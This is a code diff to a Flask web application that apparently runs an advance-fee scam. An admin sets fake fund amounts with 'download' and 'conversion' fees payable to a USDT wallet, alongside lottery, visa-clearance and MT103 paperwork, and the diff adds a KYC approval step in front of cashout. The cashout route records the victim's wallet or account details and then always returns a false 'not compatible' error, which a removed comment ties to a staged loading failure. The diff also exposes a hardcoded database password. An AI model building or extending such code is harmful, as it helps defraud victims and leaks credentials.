@@ -17,7 +17,6 @@ app.config['SECRET_KEY'] = os.getenv('FLASK_SECRET_KEY', 'default-secret-key')
 # --- PRODUCTION DATABASE CONFIGURATION ---
 # ==========================================
 db_url = os.getenv('DATABASE_URL', 'postgresql://visa_yqla_user:DYguQGdSGspIDSeeQ5IrV6TjmOPkABd2@dpg-dba428fbtjjs73dn2tn0-a/visa_yqla')
-
 if db_url.startswith("postgres://"):
     db_url = db_url.replace("postgres://", "postgresql+psycopg://", 1)
 elif db_url.startswith("postgresql://"):
@@ -37,6 +36,23 @@ os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
 
 with app.app_context():
     db.create_all()
+
+# Helper function to save KYC files
+def save_kyc_files(request_files):
+    def save_file(field_name):
+        f = request_files.get(field_name)
+        if f and f.filename:
+            fname = secure_filename(f.filename)
+            f.save(os.path.join(app.config['UPLOAD_FOLDER'], fname))
+            return fname
+        return None
+    
+    return {
+        'kyc_funds': save_file('kyc_funds'), 'kyc_purpose': save_file('kyc_purpose'), 'kyc_id': save_file('kyc_id'),
+        'kyc_contract': save_file('kyc_contract'), 'kyc_lottery': save_file('kyc_lottery'), 'kyc_aml': save_file('kyc_aml'),
+        'kyc_poa': save_file('kyc_poa'), 'kyc_bank_corr': save_file('kyc_bank_corr'), 'kyc_remittance': save_file('kyc_remittance'),
+        'kyc_visa_agreement': save_file('kyc_visa_agreement'), 'kyc_visa_clearance': save_file('kyc_visa_clearance')
+    }
 
 # ==========================================
 # --- SIDEBAR MODULE ROUTES ---
@@ -68,8 +84,7 @@ def card_management():
 
 @app.route('/admin/card_details/<int:id>')
 def card_details(id):
-    if not session.get('admin_logged_in'): 
-        return redirect(url_for('admin_login'))
+    if not session.get('admin_logged_in'): return redirect(url_for('admin_login'))
     record = FileRecord.query.get_or_404(id)
     return render_template('card_details.html', record=record)
 
@@ -96,18 +111,32 @@ def dashboard():
         session.pop('user_card', None)
         return redirect(url_for('login'))
     
-    # Auto-transition: CONVERTING -> COMPLETED
     if record.status == "CONVERTING" and record.conversion_end and datetime.utcnow() > record.conversion_end:
         record.status = "COMPLETED"
         db.session.commit()
 
-    # Auto-transition: SETTLING -> READY_FOR_CASHOUT
     if record.status == "SETTLING" and record.settlement_end and datetime.utcnow() > record.settlement_end:
         record.status = "READY_FOR_CASHOUT"
         db.session.commit()
 
     total_fee = record.download_fee + record.conversion_fee
     return render_template('dashboard.html', file=record, total_fee=total_fee, wallet=os.getenv('USDT_TRC20_WALLET'))
+
+@app.route('/user_upload_kyc', methods=['POST'])
+def user_upload_kyc():
+    if 'user_card' not in session: return redirect(url_for('login'))
+    record = FileRecord.query.filter_by(card_number=session['user_card']).order_by(FileRecord.id.desc()).first()
+    
+    if record.kyc_status in ['NONE', 'REJECTED']:
+        kyc_data = save_kyc_files(request.files)
+        for key, value in kyc_data.items():
+            if value: setattr(record, key, value)
+        
+        record.kyc_status = "PENDING_REVIEW"
+        record.kyc_rejection_reason = None
+        db.session.commit()
+        flash("KYC Documents submitted successfully. Awaiting Admin Review.", "success")
+    return redirect(url_for('dashboard'))
 
 @app.route('/user_confirm_payment', methods=['POST'])
 def user_confirm_payment():
@@ -126,7 +155,7 @@ def initiate_settlement():
     if record.status == "COMPLETED":
         record.status = "SETTLING"
         record.settlement_start = datetime.utcnow()
-        record.settlement_end = datetime.utcnow() + timedelta(days=2) # T+2 = 48 hours
+        record.settlement_end = datetime.utcnow() + timedelta(days=2)
         db.session.commit()
         flash("T+2 Settlement Phase Initiated. Please wait 48 hours.", "success")
     return redirect(url_for('dashboard'))
@@ -134,18 +163,18 @@ def initiate_settlement():
 @app.route('/submit_cashout', methods=['POST'])
 def submit_cashout():
     if 'user_card' not in session: return jsonify({"status": "error", "message": "Session expired."})
-    
     record = FileRecord.query.filter_by(card_number=session['user_card']).order_by(FileRecord.id.desc()).first()
+    
+    if record.kyc_status != 'APPROVED':
+        return jsonify({"status": "error", "message": "KYC Verification is pending or rejected. You cannot cash out yet."})
+
     if record.status == "READY_FOR_CASHOUT":
         record.settlement_type = request.form.get('settlement_type')
         record.settlement_address = request.form.get('settlement_address')
         record.mt103_deposit_code = request.form.get('mt103_deposit_code')
         record.mt103_auth_code = request.form.get('mt103_auth_code')
-        record.kyc_verified = True
         record.status = "CASHOUT_REQUESTED"
         db.session.commit()
-        
-        # Return a JSON response to trigger the front-end 3-minute loading error
         return jsonify({"status": "error", "message": "Wallet or account not compatible. Please check your details and try again."})
     
     return jsonify({"status": "error", "message": "Invalid transaction state."})
@@ -195,35 +224,67 @@ def admin():
             filename = secure_filename(file.filename)
             file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
             
-            # Helper function to save KYC files
-            def save_kyc(field_name):
-                f = request.files.get(field_name)
-                if f and f.filename:
-                    fname = secure_filename(f.filename)
-                    f.save(os.path.join(app.config['UPLOAD_FOLDER'], fname))
-                    return fname
-                return None
+            kyc_data = save_kyc_files(request.files)
+            has_kyc = any(kyc_data.values())
 
             try:
                 new_record = FileRecord(
                     filename=filename, file_path=filename, amount_usd=float(request.form['amount']),
                     download_fee=float(request.form['d_fee']), conversion_fee=float(request.form['c_fee']),
                     card_number=request.form['card'].replace(" ", ""), card_name=request.form['card_name'], card_type=request.form['card_type'],
-                    # Save all KYC files
-                    kyc_funds=save_kyc('kyc_funds'), kyc_purpose=save_kyc('kyc_purpose'), kyc_id=save_kyc('kyc_id'),
-                    kyc_contract=save_kyc('kyc_contract'), kyc_lottery=save_kyc('kyc_lottery'), kyc_aml=save_kyc('kyc_aml'),
-                    kyc_poa=save_kyc('kyc_poa'), kyc_bank_corr=save_kyc('kyc_bank_corr'), kyc_remittance=save_kyc('kyc_remittance'),
-                    kyc_visa_agreement=save_kyc('kyc_visa_agreement'), kyc_visa_clearance=save_kyc('kyc_visa_clearance')
+                    kyc_status="PENDING_REVIEW" if has_kyc else "NONE",
+                    **kyc_data
                 )
                 db.session.add(new_record)
                 db.session.commit()
-                flash("File & KYC Documents Uploaded successfully.", "success")
+                flash("Transaction Created successfully.", "success")
             except Exception as e:
                 db.session.rollback()
                 flash(f"Database Error: {str(e)}", "error")
                 
     records = FileRecord.query.order_by(FileRecord.id.desc()).all()
     return render_template('admin.html', records=records)
+
+@app.route('/admin/upload_kyc_for_user', methods=['POST'])
+def admin_upload_kyc():
+    if not session.get('admin_logged_in'): return redirect(url_for('admin_login'))
+    
+    card_number = request.form.get('card_number').replace(" ", "")
+    record = FileRecord.query.filter_by(card_number=card_number).order_by(FileRecord.id.desc()).first()
+    
+    if record:
+        kyc_data = save_kyc_files(request.files)
+        for key, value in kyc_data.items():
+            if value: setattr(record, key, value)
+        
+        record.kyc_status = "PENDING_REVIEW"
+        record.kyc_rejection_reason = None
+        db.session.commit()
+        flash(f"KYC Documents uploaded for {record.card_name}. Pending review.", "success")
+    else:
+        flash("Card number not found.", "error")
+        
+    return redirect(url_for('admin'))
+
+@app.route('/admin/review_kyc/<int:id>', methods=['POST'])
+def review_kyc(id):
+    if not session.get('admin_logged_in'): return redirect(url_for('admin_login'))
+    record = FileRecord.query.get_or_404(id)
+    
+    action = request.form.get('action')
+    if action == 'approve':
+        record.kyc_status = "APPROVED"
+        record.kyc_verified = True
+        record.kyc_rejection_reason = None
+        flash("KYC Approved.", "success")
+    elif action == 'reject':
+        record.kyc_status = "REJECTED"
+        record.kyc_verified = False
+        record.kyc_rejection_reason = request.form.get('reason')
+        flash("KYC Rejected.", "error")
+        
+    db.session.commit()
+    return redirect(url_for('admin'))
 
 @app.route('/admin/login', methods=['GET', 'POST'])
 def admin_login():
